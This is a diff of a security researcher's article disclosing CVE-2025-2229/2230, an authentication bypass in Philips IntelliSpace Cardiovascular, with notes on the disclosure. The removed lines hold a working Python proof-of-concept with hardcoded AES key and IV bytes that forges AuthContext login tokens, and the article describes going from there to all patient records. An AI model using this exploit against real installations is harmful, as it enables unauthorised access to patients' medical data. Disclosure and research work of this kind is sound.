@@ -1,5 +1,13 @@
-Title: Authentication Bypass Vulnerability in Philips IntelliSpace Cardiovascular
+Title: CVE-2025-2229 & CVE-2025-2230: Authentication Bypass Vulnerability in Philips IntelliSpace Cardiovascular
 Date: 2024-12-09
+Modified: 2025-03-13
+Slug: authentication-bypass-vulnerability-in-philips-intellispace-cardiovascular
+
+!!! update "Article updated 13/03/2025"
+    Philips has acknowledged this vulnerability and issued CVEs CVE-2025-2229 and CVE-2025-2230.  Please see [ICS Medical Advisory ICSMA-25-072-01](https://www.cisa.gov/news-events/ics-medical-advisories/icsma-25-072-01) for mitigation details.
+    Publicly publishing this vulnerability was not a decision I made lightly, however, I believed Philips' cybersecurity team had chosen not to disclose this vulnerability.  Under those circumstances, the best course of action was to publish enough details to permit cybersecurity researchers to replicate my results and apply their own mitigations.
+    I was recently able to get the attention of Philips' cybersecurity team.  It seems my initial contact was not correctly passed within Philips - something their cybersecurity team was apologetic for.  Once I was in direct contact with the cybersecurity team, they were clear and responsive throughout the process.
+    Philips stressed that my difficulties with disclosure were not the norm.
 
 Philips' IntelliSpace Cardiovascular is a cardiovascular image management system.  It is responsible for receiving images, waveforms, and other patient data into one workspace where a physician can analyze and make a diagnosis.  I'll be breaking down a vulnerability in the 3.x branch of the software.  This vulnerability allows a replay attack to be performed on the web application.  I am not the first to uncover this vulnerability, however, I believe I am the first to demonstrate that it can be upgraded into full authentication bypass on most, if not all, extant installs of IntelliSpace Cardiovascular 3.x (which is EOL at the time of writing, though still used by some organizations).  More details on the timeline, disclosure, and remediation of this vulnerability are at the end of the article.
 
@@ -12,27 +20,7 @@ ISCV provides two methods of login the user may choose between.  The application
 When the user submits the login form, authentication begins.  This is a long process happens in three "phases", each one connected in a chain by a "bridge".  For the purposes of understanding these vulnerabilities, only everything up to the first "bridge" needs to be understood.
 
 !!!d2
-shape: sequence_diagram
-Client;
-ISCV Server;
-"Part A: Request body contains values of wa, wtrealm, wctx, and wct - this request simply converts\nthem to query parameters": {
-  Client->ISCV Server: POST /STS/Forms/Login.aspx;
-  ISCV Server->Client: 302 FOUND /STS/Windows/WinLogin.aspx?wa=...&wt=...&wtrealm=...&wctx=...&wct=...;
-}
-"Part B: WWW-Authenticate challenge/response request is turned into a AuthContext token, which\nwill be redeemed in the next part": {
-  Client->ISCV Server: GET /STS/Windows/WinLogin.aspx?wa=...&wt=...&wtrealm=...&wctx=...&wct=...;
-  ISCV Server->Client: 401 UNAUTHORIZED;
-  Client->ISCV Server: GET /STS/Windows/WinLogin.aspx?wa=...&wt=...&wtrealm=...&wctx=...&wct=...;
-  ISCV Server->Client: 302 FOUND /STS/Forms/Login.aspx?AuthContext=...&wa=...&wt=...&wtrealm=...&wctx=...&wct=...;
-}
-"Part C: The client redeems the AuthContext": {
-  Client->ISCV Server: GET /STS/Forms/Login.aspx?AuthContext=...&wa=...&wt=...&wtrealm=...&wctx=...&wct=...;
-  ISCV Server->Client: 302 FOUND /STS/Forms/default.aspx?wa=...&wt=...&wtrealm=...&wctx=...&wct=...;
-}
-end: The remainder of the authentication chain will be omitted, as it is irrelevant. {
-  shape: text
-  near: bottom-center
-}
+{!articles/cybersecurity/images/iscv-flow.d2!}
 !!!
 
 Authentication begins with the raw input on the form is POSTed to `/STS/Forms/Login.aspx`, which send the client to whichever route corresponds to their selected authentication type.  Ticking the "Use Windows Authentication" box causes the response to redirect us to `/STS/Windows/WinLogin.aspx`.
@@ -64,46 +52,19 @@ If we could forge our own `AuthContext`s, we could bypass authentication altoget
 Given this information, let's develop a proof-of-concept script to forge our own `AuthContext` values.  I'll be doing this in Python, as this seems to be lingua franca for exploit PoC code.  To start, let's quickly get the plaintext constructed:
 
 ```python
-domain = input("Enter the domain name: ").upper()
-username = input("Enter the username: ").upper()
-timestamp = datetime.datetime.now()
-timestamp_formatted = timestamp \
-    .strftime("%m/%d/%Y %l:%M:%S %p") \
-    .replace("  ", " ")
-payload = f"{domain}\\{username};{timestamp_formatted}"
+{!articles/cybersecurity/attachments/philips-iscv-exploit.py!lines=25-31}
 ```
 
 Next, we need encode the message as UTF16-LE, pad it to a 16 byte interval using PKCS7, and apply AES-128 encryption.  The key and initialization vector for CBC mode are derived from the value within the ISCV configuration file.  Revealing the key and derivation is not necessary.  I have precomputed the AES parameters, as they do not change.
 
 ```python
-plaintext = payload.encode(encoding="utf-16le")
-key = bytes([
-    0x54, 0xca, 0x19, 0xea, 0xc6, 0xf9, 0xdf, 0x9b,
-    0xc3, 0xc4, 0x9b, 0xde, 0x8f, 0xd3, 0x58, 0xcc
-])
-iv = bytes([
-    0xc6, 0xf9, 0xdf, 0x9b, 0x92, 0x04, 0x69, 0x0b,
-    0xea, 0xe7, 0x60, 0x33, 0x5c, 0x3e, 0x7b, 0x6d
-])
-encryptor = AES.new(key, AES.MODE_CBC, IV=iv)
-ciphertext = encryptor.encrypt(pad(plaintext, 16, style="pkcs7"))
+{!articles/cybersecurity/attachments/philips-iscv-exploit.py!lines=33-43}
 ```
 
 Lastly, we need to embed this token within the GET parameters of a request to `/STS/Forms/Login.aspx`.  We'll prompt for the hostname, as it is also used to construct the value of `wtrealm`.
 
 ```python
-server = input("Enter the hostname/ip of the target: ")
-authcontext = base64.b64encode(ciphertext)
-params = urllib.parse.urlencode((
-    ("AuthContext", authcontext),
-    ("wctx", "rm=0&id=passive&ru=%2fISCV%2f"),
-    ("wa", "wsignin1.0"),
-    ("wct", timestamp.strftime("%Y-%m-%dT%R:%SZ")),
-    ("wtrealm", f"https://{server}/ISCV/")
-))
-url = f"https://{server}/STS/Forms/Login.aspx?{params}"
-print(f"Launching {url} in default browser...")
-webbrowser.open(url, new=0, autoraise=True)
+{!articles/cybersecurity/attachments/philips-iscv-exploit.py!lines=45-56}
 ```
 
 Once the link is opened, the remaining three "phases" go off and setup our session before finally logging us into the application.  Once we are in the application, ISCV helpfully provides an "emergency access" link that can be pressed to access all patient records.  The attacker is given a stern warning that this action will be logged, but, since the attacker is likely impersonating someone innocent, this doesn't prevent us from (ab)using this functionality to gain complete access to all records.
